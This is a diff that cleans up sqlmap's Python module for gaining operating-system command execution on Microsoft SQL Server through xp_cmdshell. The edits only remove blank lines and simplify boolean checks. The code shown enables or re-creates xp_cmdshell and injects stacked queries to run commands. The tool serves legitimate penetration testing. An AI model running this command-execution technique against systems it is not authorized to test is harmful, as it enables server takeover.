@@ -22,8 +22,6 @@ with sqlmap; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 
-
-
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.convert import urlencode
@@ -34,7 +32,6 @@ from lib.core.exception import sqlmapUnsupportedFeatureException
 from lib.request import inject
 from lib.techniques.blind.timebased import timeUse
 
-
 class xp_cmdshell:
     """
     This class defines methods to deal with Microsoft SQL Server
@@ -44,9 +41,7 @@ class xp_cmdshell:
     def __init__(self):
         self.xpCmdshellStr = "master..xp_cmdshell"
 
-
     def __xpCmdshellCreate(self):
-        # TODO: double-check that this method works properly
         cmd = ""
 
         if kb.dbmsVersion[0] in ( "2005", "2008" ):
@@ -73,7 +68,6 @@ class xp_cmdshell:
 
         self.xpCmdshellExecCmd(cmd)
 
-
     def __xpCmdshellConfigure2005(self, mode):
         debugMsg  = "configuring xp_cmdshell using sp_configure "
         debugMsg += "stored procedure"
@@ -86,7 +80,6 @@ class xp_cmdshell:
         cmd += "EXEC sp_configure 'show advanced options', 0"
 
         return cmd
-
 
     def __xpCmdshellConfigure2000(self, mode):
         debugMsg  = "configuring xp_cmdshell using sp_addextendedproc "
@@ -101,7 +94,6 @@ class xp_cmdshell:
 
         return cmd
 
-
     def __xpCmdshellConfigure(self, mode):
         if kb.dbmsVersion[0] in ( "2005", "2008" ):
             cmd = self.__xpCmdshellConfigure2005(mode)
@@ -109,7 +101,6 @@ class xp_cmdshell:
             cmd = self.__xpCmdshellConfigure2000(mode)
 
         self.xpCmdshellExecCmd(cmd)
-
 
     def __xpCmdshellCheck(self):
         query    = self.xpCmdshellForgeCmd("ping -n %d 127.0.0.1" % (conf.timeSec + 2))
@@ -120,19 +111,16 @@ class xp_cmdshell:
         else:
             return False
 
-
     def xpCmdshellForgeCmd(self, cmd):
         return "EXEC %s '%s'" % (self.xpCmdshellStr, cmd)
 
-
     def xpCmdshellExecCmd(self, cmd, silent=False, forgeCmd=False):
-        if forgeCmd == True:
+        if forgeCmd:
             cmd = self.xpCmdshellForgeCmd(cmd)
 
         cmd = urlencode(cmd, convall=True)
 
         inject.goStacked(cmd, silent)
-
 
     def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
         self.getRemoteTempPath()
@@ -157,7 +145,6 @@ class xp_cmdshell:
 
         return output
 
-
     def xpCmdshellInit(self, mandatory=True):
         self.__xpCmdshellAvailable = False
 
@@ -167,7 +154,7 @@ class xp_cmdshell:
 
         result = self.__xpCmdshellCheck()
 
-        if result == True:
+        if result:
             logger.info("xp_cmdshell extended procedure is available")
             self.__xpCmdshellAvailable = True
 
@@ -180,7 +167,7 @@ class xp_cmdshell:
             if not choice or choice in ("y", "Y"):
                 self.__xpCmdshellConfigure(1)
 
-                if self.__xpCmdshellCheck() == True:
+                if self.__xpCmdshellCheck():
                     logger.info("xp_cmdshell re-enabled successfully")
                     self.__xpCmdshellAvailable = True
 
@@ -191,7 +178,7 @@ class xp_cmdshell:
                     self.__xpCmdshellConfigure(0)
                     self.__xpCmdshellCreate()
 
-                    if self.__xpCmdshellCheck() == True:
+                    if self.__xpCmdshellCheck():
                         logger.info("xp_cmdshell created successfully")
                         self.__xpCmdshellAvailable = True
 
@@ -200,14 +187,14 @@ class xp_cmdshell:
                         warnMsg += "because sp_OACreate is disabled"
                         logger.warn(warnMsg)
 
-        if self.__xpCmdshellAvailable == False and mandatory == False:
+        if not self.__xpCmdshellAvailable and not mandatory:
             warnMsg  = "unable to get xp_cmdshell working, sqlmap will "
             warnMsg += "try to proceed without it"
             logger.warn(warnMsg)
 
             self.envInitialized = True
 
-        elif self.__xpCmdshellAvailable == False:
+        elif not self.__xpCmdshellAvailable:
             errMsg = "unable to proceed without xp_cmdshell"
             raise sqlmapUnsupportedFeatureException, errMsg
 
